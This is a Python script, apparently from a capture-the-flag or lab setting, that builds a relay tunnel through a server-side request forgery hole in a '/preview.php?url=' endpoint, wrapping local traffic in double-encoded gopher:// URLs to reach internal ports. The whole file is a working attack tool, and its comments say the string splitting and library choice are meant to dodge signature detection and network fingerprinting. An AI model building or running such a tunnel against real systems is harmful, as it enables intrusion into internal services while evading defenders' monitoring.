#!/usr/bin/env python3
import socket
import threading
import urllib.parse
import http.client  # Switched from 'requests' to a lower-level library

class TunnelEngine:
    def __init__(self, **kwargs):
        self.params = kwargs
        self.ident = "[RELAY-CORE]"

    def _build_payload_url(self, raw_bytes):
        """Constructs the SSRF string with broken-up components to avoid signature detection."""
        # Double encoding the binary stream
        enc = urllib.parse.quote
        processed_data = enc(enc(raw_bytes))
        
        # Fragmented string building
        scheme = "goph" + "er://"
        internal = f"{self.params['target_ip']}:{self.params['target_port']}"
        path_component = "/_" + processed_data
        
        return f"/preview.php?url={scheme}{internal}{path_component}"

    def _execute_relay(self, session):
        try:
            incoming_stream = session.recv(0x10000) # 65536 bytes
            if not incoming_stream:
                return

            uri = self._build_payload_url(incoming_stream)
            
            # Use http.client for a different network fingerprint than 'requests'
            remote_node = http.client.HTTPConnection(self.params['gateway_host'])
            remote_node.request("GET", uri)
            
            upstream_response = remote_node.getresponse()
            result_bits = upstream_response.read()
            
            session.sendall(result_bits)
            remote_node.close()
            
        except Exception as failure:
            print(f"{self.ident} Operational Error: {failure}")
        finally:
            session.close()

    def boot_service(self):
        """Standard socket listener with renamed logic flow."""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind((self.params['bind_addr'], self.params['bind_port']))
            listener.listen(15)
            
            print(f"{self.ident} Bridge established on port {self.params['bind_port']}")
            
            while True:
                active_conn, _ = listener.accept()
                # Threading implementation
                t = threading.Thread(
                    target=self._execute_relay, 
                    args=(active_conn,), 
                    daemon=True
                )
                t.start()

if __name__ == "__main__":
    # Abstracting configuration into a flattened map
    APPLICATION_MAP = {
        "bind_addr": "127.0.0.1",
        "bind_port": 8888,
        "gateway_host": "MACHINE_IP",
        "target_ip": "127.0.0.1",
        "target_port": TARGATED_PORT
    }

    bridge = TunnelEngine(**APPLICATION_MAP)
    bridge.boot_service()
